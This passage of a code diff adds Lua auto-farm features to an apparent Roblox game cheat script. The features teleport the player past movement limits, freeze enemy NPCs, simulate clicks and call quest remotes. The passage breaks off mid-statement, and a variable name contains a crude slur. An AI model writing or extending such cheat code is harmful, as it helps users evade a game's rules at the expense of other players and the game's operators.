+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos2.Position).Magnitude > 1500 then
+								BTP(MaterialsPos2);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos2.Position).Magnitude < 1500 then
+								topos(MaterialsPos2);
+							end;
+						else
+							topos(MaterialsPos2);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Water Fighter") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Water Fighter")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World1 or World2 then
+	ItemsTab:Toggle("Auto Farm Magma Ore", _G.Makori_gay, "Auto Farm Magma Ore", function(value)
+		_G.Umm = value;
+		StopTween(_G.Umm);
+	end);
+	local MaterialsPos3 = CFrame.new(-5850.2802734375, 77.28675079345703, 8848.6748046875);
+	spawn(function()
+		while wait() do
+			if _G.Umm and World1 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Military Spy") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Military Spy" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Umm or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos3.Position).Magnitude > 1500 then
+								BTP(MaterialsPos3);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos3.Position).Magnitude < 1500 then
+								topos(MaterialsPos3);
+							end;
+						else
+							topos(MaterialsPos3);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-5850.2802734375, 77.28675079345703, 8848.6748046875));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Military Spy") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Military Spy")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+	local MaterialsPos4 = CFrame.new(-5234.60595703125, 51.953372955322266, -4732.27880859375);
+	spawn(function()
+		while wait() do
+			if _G.Umm and World2 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Lava Pirate") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Lava Pirate" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Umm or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos4.Position).Magnitude > 1500 then
+								BTP(MaterialsPos4);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos4.Position).Magnitude < 1500 then
+								topos(MaterialsPos4);
+							end;
+						else
+							topos(MaterialsPos4);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-5234.60595703125, 51.953372955322266, -4732.27880859375));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Lava Pirate") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Lava Pirate")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World1 then
+	ItemsTab:Toggle("Auto Farm Angel Wings", _G.Makori_gay, false, function(value)
+		_G.Auto_Wing = value;
+		StopTween(_G.Auto_Wing);
+	end);
+	local MaterialsPos5 = CFrame.new(-7827.15625, 5606.912109375, -1705.5833740234375);
+	spawn(function()
+		while wait() do
+			if _G.Auto_Wing and World1 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Royal Soldier") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Royal Soldier" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Auto_Wing or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos5.Position).Magnitude > 1500 then
+								BTP(MaterialsPos5);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos5.Position).Magnitude < 1500 then
+								topos(MaterialsPos5);
+							end;
+						else
+							topos(MaterialsPos5);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-7827.15625, 5606.912109375, -1705.5833740234375));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Royal Soldier") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Royal Soldier")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World1 or World2 or World3 then
+	ItemsTab:Toggle("Auto Farm Leather", _G.Makori_gay, false, function(value)
+		_G.Leather = value;
+		StopTween(_G.Leather);
+	end);
+	local MaterialsPos6 = CFrame.new(-1211.8792724609375, 4.787090301513672, 3916.83056640625);
+	spawn(function()
+		while wait() do
+			if _G.Leather and World1 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Pirate") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Pirate" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Leather or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos6.Position).Magnitude > 1500 then
+								BTP(MaterialsPos6);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos6.Position).Magnitude < 1500 then
+								topos(MaterialsPos6);
+							end;
+						else
+							topos(MaterialsPos6);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-1211.8792724609375, 4.787090301513672, 3916.83056640625));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Pirate") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Pirate")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+	local MaterialsPos7 = CFrame.new(-2010.5059814453125, 73.00115966796875, -3326.620849609375);
+	spawn(function()
+		while wait() do
+			if _G.Leather and World2 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Marine Captain") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Marine Captain" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Leather or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos7.Position).Magnitude > 1500 then
+								BTP(MaterialsPos7);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos7.Position).Magnitude < 1500 then
+								topos(MaterialsPos7);
+							end;
+						else
+							topos(MaterialsPos7);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-2010.5059814453125, 73.00115966796875, -3326.620849609375));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Marine Captain") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Marine Captain")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+	local MaterialsPos8 = CFrame.new(-11975.78515625, 331.7734069824219, -10620.0302734375);
+	spawn(function()
+		while wait() do
+			if _G.Leather and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Jungle Pirate") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Jungle Pirate" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not _G.Leather or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos8.Position).Magnitude > 1500 then
+								BTP(MaterialsPos8);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos8.Position).Magnitude < 1500 then
+								topos(MaterialsPos8);
+							end;
+						else
+							topos(MaterialsPos8);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-11975.78515625, 331.7734069824219, -10620.0302734375));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Jungle Pirate") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Jungle Pirate")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World1 or World2 or World3 then
+	ItemsTab:Toggle("Auto Farm Ectoplasm", _G.AutoEctoplasm, false, function(value)
+		_G.AutoEctoplasm = value;
+		StopTween(_G.AutoEctoplasm);
+	end);
+	ItemsTab:Toggle("Auto Farm Scrap Metal", false, false, function(value)
+		Scrap = value;
+		StopTween(Scrap);
+	end);
+	local MaterialsPos9 = CFrame.new(-1132.4202880859375, 14.844913482666016, 4293.30517578125);
+	spawn(function()
+		while wait() do
+			if Scrap and World1 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Brute") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Brute" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Scrap or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos9.Position).Magnitude > 1500 then
+								BTP(MaterialsPos9);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos9.Position).Magnitude < 1500 then
+								topos(MaterialsPos9);
+							end;
+						else
+							topos(MaterialsPos9);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-1132.4202880859375, 14.844913482666016, 4293.30517578125));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Brute") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Brute")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+	local MaterialsPos10 = CFrame.new(-972.307373046875, 73.04473876953125, 1419.2901611328125);
+	spawn(function()
+		while wait() do
+			if Scrap and World2 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Mercenary") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Mercenary" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Scrap or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos10.Position).Magnitude > 1500 then
+								BTP(MaterialsPos10);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos10.Position).Magnitude < 1500 then
+								topos(MaterialsPos10);
+							end;
+						else
+							topos(MaterialsPos10);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-972.307373046875, 73.04473876953125, 1419.2901611328125));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Mercenary") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Mercenary")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+	local MaterialsPos11 = CFrame.new(-289.6311950683594, 43.8282470703125, 5583.66357421875);
+	spawn(function()
+		while wait() do
+			if Scrap and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Pirate Millionaire") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Pirate Millionaire" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Scrap or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos11.Position).Magnitude > 1500 then
+								BTP(MaterialsPos11);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos11.Position).Magnitude < 1500 then
+								topos(MaterialsPos11);
+							end;
+						else
+							topos(MaterialsPos11);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-289.6311950683594, 43.8282470703125, 5583.66357421875));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Pirate Millionaire") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Pirate Millionaire")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World3 then
+	ItemsTab:Toggle("Auto Farm Conjured Cocoa", false, false, function(value)
+		Cocoafarm = value;
+		StopTween(Cocoafarm);
+	end);
+	local MaterialsPos12 = CFrame.new(744.7930908203125, 24.76934242248535, -12637.7255859375);
+	spawn(function()
+		while wait() do
+			if Cocoafarm and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Chocolate Bar Battler") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Chocolate Bar Battler" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Cocoafarm or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos12.Position).Magnitude > 1500 then
+								BTP(MaterialsPos12);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos12.Position).Magnitude < 1500 then
+								topos(MaterialsPos12);
+							end;
+						else
+							topos(MaterialsPos12);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(744.7930908203125, 24.76934242248535, -12637.7255859375));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Chocolate Bar Battler") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Chocolate Bar Battler")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World3 then
+	ItemsTab:Toggle("Auto Farm Dragon Scale", false, false, function(value)
+		Dragon_Scale = value;
+		StopTween(Dragon_Scale);
+	end);
+	local MaterialsPos13 = CFrame.new(5824.06982421875, 51.38640213012695, -1106.694580078125);
+	spawn(function()
+		while wait() do
+			if Dragon_Scale and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Dragon Crew Warrior") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Dragon Crew Warrior" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Dragon_Scale or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos13.Position).Magnitude > 1500 then
+								BTP(MaterialsPos13);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos13.Position).Magnitude < 1500 then
+								topos(MaterialsPos13);
+							end;
+						else
+							topos(MaterialsPos13);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(5824.06982421875, 51.38640213012695, -1106.694580078125));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Dragon Crew Warrior") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Dragon Crew Warrior")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World3 then
+	ItemsTab:Toggle("Auto Farm Gunpowder", false, false, function(value)
+		Gunpowder = value;
+		StopTween(Gunpowder);
+	end);
+	local MaterialsPos14 = CFrame.new(-379.6134338378906, 73.84449768066406, 5928.5263671875);
+	spawn(function()
+		while wait() do
+			if Gunpowder and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Pistol Billionaire") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Pistol Billionaire" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Gunpowder or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos14.Position).Magnitude > 1500 then
+								BTP(MaterialsPos14);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos14.Position).Magnitude < 1500 then
+								topos(MaterialsPos14);
+							end;
+						else
+							topos(MaterialsPos14);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-379.6134338378906, 73.84449768066406, 5928.5263671875));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Pistol Billionaire") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Pistol Billionaire")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World3 then
+	ItemsTab:Toggle("Auto Farm Fish Tail World 3", false, false, function(value)
+		Fish = value;
+		StopTween(Fish);
+	end);
+	local MaterialsPos15 = CFrame.new(-10961.0126953125, 331.7977600097656, -8914.29296875);
+	spawn(function()
+		while wait() do
+			if Fish and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Fishman Captain") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Fishman Captain" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not Fish or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos15.Position).Magnitude > 1500 then
+								BTP(MaterialsPos15);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos15.Position).Magnitude < 1500 then
+								topos(MaterialsPos15);
+							end;
+						else
+							topos(MaterialsPos15);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-10961.0126953125, 331.7977600097656, -8914.29296875));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Fishman Captain") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Fishman Captain")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+if World3 then
+	ItemsTab:Toggle("Auto Farm Mini Tusk", false, false, function(value)
+		MiniHee = value;
+		StopTween(MiniHee);
+	end);
+	local MaterialsPos16 = CFrame.new(-13516.0458984375, 469.8182373046875, -6899.16064453125);
+	spawn(function()
+		while wait() do
+			if MiniHee and World3 then
+				pcall(function()
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Mythological Pirate") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Mythological Pirate" then
+								if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+									repeat
+										task.wait();
+										AutoHaki();
+										EquipWeapon(_G.SelectWeapon);
+										v.HumanoidRootPart.CanCollide = false;
+										v.Humanoid.WalkSpeed = 0;
+										v.Head.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										topos(v.HumanoidRootPart.CFrame * Pos);
+										(game:GetService("VirtualUser")):CaptureController();
+										(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+									until not MiniHee or (not v.Parent) or v.Humanoid.Health <= 0;
+									StartBring = false;
+								end;
+							end;
+						end;
+					else
+						if BypassTP then
+							if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos16.Position).Magnitude > 1500 then
+								BTP(MaterialsPos16);
+							elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - MaterialsPos16.Position).Magnitude < 1500 then
+								topos(MaterialsPos16);
+							end;
+						else
+							topos(MaterialsPos16);
+						end;
+						UnEquipWeapon(_G.SelectWeapon);
+						topos(CFrame.new(-13516.0458984375, 469.8182373046875, -6899.16064453125));
+						if (game:GetService("ReplicatedStorage")):FindFirstChild("Mythological Pirate") then
+							topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Mythological Pirate")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+						end;
+					end;
+				end);
+			end;
+		end;
+	end);
+end;
+spawn(function()
+	while wait() do
+		if SelectedMasteryMode == "Level Farm" and _G.AutoFarmFruitMastery then
+			pcall(function()
+				CheckQuest();
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, NameMon) then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					repeat
+						wait();
+						TP1(CFrameQuest);
+					until (CFrameQuest.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or (not _G.AutoFarmFruitMastery);
+					if (CFrameQuest.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild(Mon) then
